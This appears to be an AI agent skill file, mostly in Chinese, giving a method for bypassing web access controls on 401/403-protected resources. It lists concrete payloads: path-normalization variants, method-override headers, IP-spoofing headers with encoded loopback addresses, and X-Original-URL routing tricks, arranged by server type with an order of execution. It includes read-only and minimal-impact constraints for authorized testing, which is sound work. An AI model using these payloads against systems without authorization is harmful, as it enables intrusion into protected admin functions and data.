---
name: auth-bypass-techniques
description: >-
  Access control bypass methodology. Use when a resource returns 401/403 or
  redirects to login, and you need to test whether the access control itself
  is flawed via path normalization, method override, routing-header confusion
  or content-type tricks. Not a WAF bypass skill.
---

# SKILL: Access Control Bypass Techniques — 访问控制绕过手册

> **用途**：针对受保护资源（401/403/302 跳登录）测试访问控制实现缺陷。目标是取回真实业务数据或功能，不是改变状态码。所有结论必须有基线对照证据。

## 0. RELATED ROUTING

- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md)：请求被 WAF 拦截（403 带拦截页/连接重置）时先处理 WAF，再回来做访问控制绕过
- [http-parameter-pollution](../http-parameter-pollution/SKILL.md)：参数层绕过细节

---

## 1. 路径归一化绕过（优先级最高）

代理与后端对路径的解析不一致时，代理按原路径判权、后端按归一化路径路由，即可绕过。

| 变体（目标 `/admin`） | 原理 | 典型命中环境 |
|---|---|---|
| `/api/..;/admin`、`/xxx/..;/admin` | `..;` 在代理处不被解析 | **Tomcat / Spring Boot**（最常见） |
| `/admin;jsessionid=x`、`/admin;.js`、`/admin;a=b` | Spring 忽略 `;` 后参数，过滤器按整串匹配 | Spring |
| `/admin/`、`/admin/.`、`/admin//`、`//admin` | 尾斜杠/多余段，规则精确匹配失效 | 通用 |
| `/Admin`、`/ADMIN`、`/aDmIn` | 大小写不敏感文件系统/框架 | IIS、Windows、部分 PHP |
| `/admin%20`、`/admin%09`、`/admin.` | 尾部空白/点被框架裁剪 | PHP（去尾点/空格）、部分网关 |
| `/%2e%2e/admin`、`/..%2fadmin`、`/admin%2f..%2fadmin` | 编码分隔符，代理不解码 | Nginx + 后端自解码 |
| `/./admin`、`/xxx/../admin` | 点段清理差异 | 通用 |
| `/admin%00`、`/admin%00.json` | 空字节截断，绕扩展名/后缀检查 | 旧版 Tomcat/PHP、扩展名校验场景 |
| `/%61dmin`、`/admi%6e`、`/admin%252f` | 单字符编码/双重编码，解码次数差异 | 解两次的后端、只解一次的 WAF |
| `/admin\`、`/admin::$DATA` | 反斜杠解析 / NTFS ADS 流读取（只读） | **IIS / Windows** |
| `/admin%0d`、`/.admin` | CR 字符 / 前导点 | Apache |
| `///admin///`、`/./admin/./`、`/;/admin` | 冗余分隔符清理差异 | 通用 |

要点：
- 变体请求的路径**必须能路由到目标资源**才算绕过，404 说明路由也变了，无效。
- 每类取 2~3 个代表变体即可，不要穷举。

## 2. HTTP 方法绕过

**安全约束（强制）**：禁止使用 DELETE；禁止主动使用 PUT / PATCH / 自定义方法等写入型方法探测（仅当接口文档或 `methods_available` 明确其为该接口合法方法、且使用最小空请求体时除外）。默认探测只使用 GET / HEAD / OPTIONS / TRACE 与最小请求体 `{}` 的 POST。

| 技术 | 示例 | 原理 |
|---|---|---|
| 只读方法探测 | `OPTIONS`（读 `Allow` 头）、`HEAD`、`TRACE` | 规则集遗漏；TRACE 可能回显敏感请求头（XST） |
| GET↔POST 互换 | 401 的 GET 改用最小请求体 `{}` 的 POST | 权限规则只绑定单一方法 |
| 方法覆盖头 | `X-HTTP-Method-Override` / `X-Method-Override` / `X-HTTP-Method`，取值仅限 GET 或 POST | 代理按原方法判权、后端按头部路由 |

## 3. 路由与头部混淆

| 头 | 示例 | 原理 |
|---|---|---|
| `X-Original-URL` / `X-Rewrite-URL` | `X-Original-URL: /admin`，请求行保持 `/` | IIS / 旧式反向代理用头部重写路由，判权用请求行 |
| IP 伪造头族 | `X-Forwarded-For`、`X-Real-IP`、`True-Client-IP`、`X-Client-IP`、`X-Originating-IP`、`X-Custom-IP-Authorization`，取值 `127.0.0.1` / `::1` / 内网段 | IP 白名单信任代理头 |
| `Host` / `X-Forwarded-Host` | 换成内网域名或管理域 | 虚拟主机级权限差异 |
| `Referer` / `Origin` | 指向目标站点自身域名 | 来源校验绕过 |
| `X-Requested-With: XMLHttpRequest` | 标记为 AJAX 请求 | 部分网关对 AJAX 单独放行 |

IP 编码变体：`0177.0.0.1`（八进制）、`2130706433`（十进制）、`0x7f000001`（十六进制）、`localhost`——部分白名单解析器接受。

注意：IP 伪造类测试只在目标明确存在 IP 白名单迹象（如"仅限内网访问"提示）时值得做。

## 4. 请求体与参数层技巧

| 技术 | 说明 |
|---|---|
| Content-Type 切换 | JSON ↔ `application/x-www-form-urlencoded` ↔ multipart；部分权限/解析中间件只处理一种格式 |
| GET 带 body | 少数框架接受，判权逻辑未覆盖 |
| JSON 数组包裹 | `[{"user":"x"}]` 绕过按对象结构的规则 |
| 参数污染 | `?id=1&id=2`、同名参数不同值，判权取第一个、业务取最后一个（详见 HPP 技能） |

## 5. 协议降级与组合

| 技术 | 示例 | 原理 |
|---|---|---|
| HTTP/1.0 降级 | `GET /admin HTTP/1.0` | 部分 ACL 只对 HTTP/1.1 生效 |

单一技术失败时可尝试组合（全部只读）：方法+路径（最小体 `POST /ADMIN/`）、头部+路径（`X-Forwarded-For: 127.0.0.1` + `/admin%20`）、协议+路径（HTTP/1.0 + 编码路径）。

## 6. 服务端技术速查

| 服务端 | 优先变体 |
|---|---|
| Apache | `/admin/`（尾斜杠）、`/.admin`、`/admin%0d` |
| Nginx | `/Admin`（大小写）、`X-Original-URL`、`/%2e/admin` |
| IIS / ASP.NET | `/admin;.css`、`/admin\`、`/admin::$DATA`、`/admin%20`、大小写 |
| Tomcat / Java | `/admin;foo`、`/admin..;/`、`/;/admin` |
| Spring | `/admin/`（尾斜杠）、`;` 参数、尾缀匹配 |

## 7. 执行顺序（每个受保护目标）

```
1. 基线：原样请求，记录状态码/响应体（作为对照）
2. 路径归一化：选 §1 中与后端技术匹配的前 3 个变体
3. 方法绕过：OPTIONS 探允许方法 → 方法覆盖头
4. 头部混淆：有 IP 白名单迹象才做；否则试 X-Original-URL
5. 全部失败即判定访问控制有效，停止，转向下一目标
```

## 8. 判定规则（反幻觉）

1. **绕过成立 = 取回了基线拿不到的真实业务数据、管理功能或更大访问范围**。状态码从 403 变 200 但响应仍是错误页/登录页，不算绕过。
2. 每个结论保留：基线请求、绕过请求、两者响应关键差异。
3. 确认绕过后按最小影响原则取证，不继续遍历该保护面下的其他资源做无价值扩散。
4. 遵守白帽子职业操守：只验证可达性与数据暴露范围，不执行业务破坏性动作。
